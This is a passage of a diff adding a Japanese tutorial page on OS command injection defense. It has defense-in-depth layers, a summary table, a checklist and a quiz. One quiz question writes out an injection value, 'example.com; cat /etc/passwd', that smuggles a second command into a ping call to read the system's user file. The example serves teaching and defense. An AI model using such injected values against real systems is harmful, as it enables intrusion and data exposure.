+        <tr><td><strong>言語ランタイム</strong></td><td>PHP / Python / Perl などの更新</td></tr>
+        <tr><td><strong>ライブラリ・外部ツール</strong></td><td>ImageMagick など、コマンド連携で使いがちな部品</td></tr>
+      </tbody>
+    </table></div>
+<pre><code>【多層防御のイメージ】
+
+第1層: OSコマンドを使わない / シェルを介さない / 入力を渡さない
+第2層: エスケープとパラメータ検証
+第3層: 最小権限でアプリを動かす
+第4層: OS・ミドルウェアのパッチ適用</code></pre>
+    <p>どれか1つだけでは不十分です。<strong>侵入しにくくする対策</strong> と <strong>侵入されても被害を抑える対策</strong> の両方を積みます。</p>
+
+    <h2 id="sec-6"><span class="num">6.</span>まとめ</h2>
+    <div class="table-wrap"><table>
+      <thead><tr><th>項目</th><th>要点</th></tr></thead>
+      <tbody>
+        <tr><td><strong>何が起きるか</strong></td><td>外部入力が OS コマンドとして実行され、サーバーを乗っ取られる</td></tr>
+        <tr><td><strong>主な被害</strong></td><td>ファイルの閲覧・改ざん・削除、迷惑メール、他サーバーへの攻撃、暗号通貨採掘</td></tr>
+        <tr><td><strong>原因</strong></td><td>シェルのメタ文字がエスケープされていない / シェル経由の関数を使っている</td></tr>
+        <tr><td><strong>最良の対策</strong></td><td>OSコマンド呼び出し自体を使わない</td></tr>
+        <tr><td><strong>次善の対策</strong></td><td>シェルを介さない / 外部入力をコマンドに渡さない</td></tr>
+        <tr><td><strong>やむを得ない場合</strong></td><td>安全なエスケープ関数・環境変数経由・許可リスト検証</td></tr>
+        <tr><td><strong>被害軽減</strong></td><td>最小権限での稼働、OS・ミドルウェアのパッチ適用</td></tr>
+      </tbody>
+    </table></div>
+    <div class="callout key">
+      <p class="callout-title">OSコマンド呼び出し安全の基本</p>
+      <ol>
+        <li>できるなら OS コマンドを呼ばない（ライブラリや言語標準機能を使う）</li>
+        <li>呼ぶならシェルを介さない（コマンドと引数を分離する）</li>
+        <li>外部入力をコマンドラインに渡さない（ID 管理・許可リスト）</li>
+        <li>どうしても渡すなら、安全な関数でエスケープし、形式を厳しく検証する</li>
+        <li>アプリは最小権限で動かし、OS やミドルウェアは最新に保つ</li>
+      </ol>
+    </div>
+
+    <h2 id="sec-7"><span class="num">7.</span>理解度チェック</h2>
+    <details>
+      <summary>Q1. <code>system("ping -c 1 " . $host)</code> に <code>example.com; cat /etc/passwd</code> を渡すと、何が起きますか？</summary>
+      <div class="body">
+        <p>シェルが <code>;</code> をコマンドの区切りと解釈するため、<code>ping -c 1 example.com</code> のあとに <code>cat /etc/passwd</code> も実行され、ユーザー一覧ファイルの中身が表示されます。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q2. 脆弱性が生まれる2つの原因は何ですか？</summary>
+      <div class="body">
+        <p>① シェルのメタ文字（<code>;</code> <code>|</code> <code>&amp;</code> など）がエスケープされていないこと、② シェル経由でコマンドを実行する関数（PHP の <code>system()</code>、Python の <code>shell=True</code> など）を使っていることです。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q3. <code>subprocess.run(["ping", "-c", "1", host])</code> の形が安全寄りなのはなぜですか？</summary>
+      <div class="body">
+        <p>シェルを介さず、コマンドと引数を分けて直接プログラムを起動するからです。<code>host</code> に <code>;</code> や <code>|</code> が含まれていても、区切りではなく1つの引数の中の「ただの文字」として渡されます。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q4. 対策の中で最も優先度が高いものは何ですか？ エスケープはどの位置づけですか？</summary>
+      <div class="body">
+        <p>最優先は <strong>OS コマンド呼び出し自体を使わない</strong>（ライブラリや言語標準機能で代替する）ことです。エスケープはミスや誤用が起きやすいため、「シェルを介さない」「外部入力を渡さない」が使えない場合の最後の手段に近い位置づけです。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q5. Perl で <code>open(my $fh, $filename)</code> が危険になりやすいのはなぜですか？ どう書き換えますか？</summary>
+      <div class="body">
+        <p>2引数の <code>open</code> は、ファイル名の内容次第でパイプやシェルを起動してしまうことがあるからです。<code>sysopen(my $fh, $filename, O_RDONLY)</code> か、モードを明示した3引数形式 <code>open(my $fh, '&lt;', $filename)</code> を使います。</p>
+      </div>
+    </details>
+    <details>
+      <summary>Q6. インジェクションを防げていれば、アプリを root で動かしても問題ありませんか？</summary>
+      <div class="body">
+        <p>問題があります。万一突破されたときに、root ならサーバー全体を即座に掌握されます。専用の低権限ユーザーで動かし、OS・ミドルウェアのパッチも当てて、侵入されても被害を抑える層を重ねます。</p>
+      </div>
+    </details>
+
+    <h2 id="sources">参考資料</h2>
+    <ul class="sources">
+      <li>ノート：72_Web脆弱性対策/20_インジェクション/05_OSコマンド呼び出しの際に発生する脆弱性（徳丸本14章）</li>
+      <li>徳丸浩『体系的に学ぶ 安全なWebアプリケーションの作り方 第2版』SBクリエイティブ</li>
+      <li>IPA「安全なウェブサイトの作り方」 https://www.ipa.go.jp/security/vuln/websecurity/about.html</li>
+      <li>OWASP「OS Command Injection Defense Cheat Sheet」 https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html</li>
+      <li>PHP マニュアル「proc_open」「escapeshellarg」 https://www.php.net/manual/ja/function.proc-open.php</li>
+      <li>Python ドキュメント「subprocess — サブプロセス管理」 https://docs.python.org/ja/3/library/subprocess.html</li>
+    </ul>
+
+    <nav class="pager" aria-label="ページ移動">
+      <a class="prev" href="20-3_SQLインジェクション.html"><span class="lbl">← 前のページ</span>SQLインジェクション</a>
+      <a class="idx" href="00-0_目次.html">目次</a>
+      <a class="next" href="20-5_メールヘッダインジェクション.html"><span class="lbl">次のページ →</span>メールヘッダインジェクション</a>
+    </nav>
+  </main>
+</div>
+
+<script src="../../_解説HTML/script.js"></script>
+</body>
+</html>
